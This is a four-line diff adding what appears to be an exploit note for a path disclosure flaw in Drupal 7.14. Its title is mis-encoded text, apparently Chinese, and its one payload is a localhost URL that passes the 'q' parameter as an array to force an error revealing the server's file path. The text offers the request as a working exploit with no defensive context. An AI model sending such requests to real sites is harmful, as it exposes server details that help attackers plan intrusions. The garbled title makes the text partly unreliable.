@@ -1,0 +1,4 @@
+Drupal 7.14 ¾ø¶ÔÂ·¾¶Ð¹Â©Â©¶´
+
+exploit:
+http://localhost/?q[]=x
